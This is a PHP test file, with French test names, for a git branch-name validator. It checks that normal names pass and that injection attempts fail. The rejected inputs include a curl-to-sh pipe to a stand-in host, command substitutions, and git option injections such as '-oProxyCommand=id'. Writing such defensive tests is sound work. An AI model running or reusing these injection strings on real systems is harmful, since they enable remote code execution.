<?php

use App\Support\Git\NomDeBranche;

it('accepte les noms de branche en usage', function (string $nom) {
    expect(NomDeBranche::estValide($nom))->toBeTrue();
})->with([
    'presentation',
    'esbtp-abidjan',
    'ucao-benin',
    'main',
    'feat/lmd-jury_v2',
    'release/2026.09',
    'claude/gifted-mendel-vqn7mn',
]);

it('refuse tout ce qui pourrait atteindre un shell ou une option git', function (mixed $nom) {
    expect(NomDeBranche::estValide($nom))->toBeFalse();
})->with([
    'injection shell'      => 'presentation;curl https://x.example/p|sh',
    'substitution'         => 'main$(id)',
    'backticks'            => 'main`id`',
    'espace'               => 'main extra',
    'retour ligne'         => "main\nid",
    'option git'           => '-oProxyCommand=id',
    'double tiret'         => '--upload-pack=id',
    'remontee'             => 'feat/../main',
    'double slash'         => 'feat//x',
    'point initial'        => '.cache',
    'slash final'          => 'feat/',
    'suffixe lock'         => 'main.lock',
    'composant cache'      => 'feat/.x',
    'vide'                 => '',
    'trop long'            => str_repeat('a', 101),
    'saut de ligne final'  => "main\n",
    'pas une chaine'       => [['main']],
    'null'                 => null,
]);

it('explique pourquoi un nom en tiret est refuse', function () {
    expect(NomDeBranche::motifDeRefus('-x'))->toContain('option');
});
